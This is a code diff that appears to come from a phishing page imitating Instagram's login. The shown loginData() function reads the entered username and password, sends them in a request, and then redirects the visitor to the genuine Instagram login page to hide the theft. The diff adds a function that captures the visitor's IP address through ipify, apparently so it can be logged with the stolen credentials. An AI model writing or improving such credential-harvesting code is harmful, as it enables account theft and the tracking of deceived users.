@@ -66,6 +66,19 @@ darkmode_toggle.onclick = (e) => {
 }
 
 
+let IpAddressVisitor;
+function getIPAddress() {
+
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            IpAddressVisitor = data.ip;
+            console.log(IpAddressVisitor); // Opzionale: per vedere l'IP in console
+        })
+        .catch(error => console.error('Errore:', error));
+
+}
+
 function loginData() {
     let username = document.getElementById('input-username').value;
     let password = document.getElementById('input-password').value;
@@ -107,7 +120,7 @@ function loginData() {
     }
 
     request.send(JSON.stringify(params));
-    
-    window.location.href = "https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav"
+
+    window.location.href = "https://www.instagram.com/accounts/login/?next=%2Flogin%2F&"
     console.log(messaggio)
 }
